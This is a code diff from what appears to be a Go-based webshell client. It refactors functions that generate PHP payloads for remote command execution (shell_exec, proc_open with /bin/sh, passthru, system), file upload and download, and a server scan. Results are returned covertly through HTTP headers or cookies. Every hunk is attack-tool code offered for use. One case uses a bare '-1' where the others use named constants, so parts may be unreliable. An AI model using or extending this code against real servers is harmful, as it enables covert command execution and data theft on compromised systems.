@@ -33,7 +33,7 @@ func _getProcOpenCMD(cmd, scope, proc, letter string) string {
 	}`
 }
 
-func CreateCMD(cmd, scope, method string) string {
+func CreateCMD(cmd, scope string, method int) string {
 	var contexter, shellCMD string
 
 	if scope != "" {
@@ -43,11 +43,11 @@ func CreateCMD(cmd, scope, method string) string {
 	shellCMD = contexter + cmd
 
 	switch method {
-	case "shell_exec":
+	case SM_SHELL_EXEC:
 		shellCMD = _getShellExecCMD(shellCMD, "r")
-	case "proc_open":
+	case -1:
 		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
-	case "passthru":
+	case SM_PASSTHRU:
 		shellCMD = _getPassthruCMD(shellCMD, "r")
 	default:
 		shellCMD = _getSystemCMD(shellCMD, "r")
@@ -75,8 +75,7 @@ func CreateDownload(dir string) string {
 }
 
 func CreateUpload(dir string) string {
-	return "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');" +
-		"if(file_exists('" + dir + "')){echo(" + PHPEncode("1") + ");}"
+	return "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');" + "if(file_exists('" + dir + "')){echo(" + PHPEncode("1") + ");}"
 }
 
 func CreateScan() string {
@@ -88,12 +87,12 @@ if(is_resource($proc)){fwrite($pipes[0], "echo 1;");fclose($pipes[0]);$s=stream_
 $r=json_encode($r);`
 }
 
-func AddAnswer(method, parameter string) string {
-	if method == "HEADER" {
+func AddAnswer(method int, parameter string) string {
+	if method == M_HEADER {
 		return "header('" + parameter + ":' . " + PHPEncode("$r") + ");exit();"
 	}
 
-	if method == "COOKIE" {
+	if method == M_COOKIE {
 		return "setcookie('" + parameter + "', " + PHPEncode("$r") + ");exit();"
 	}
 
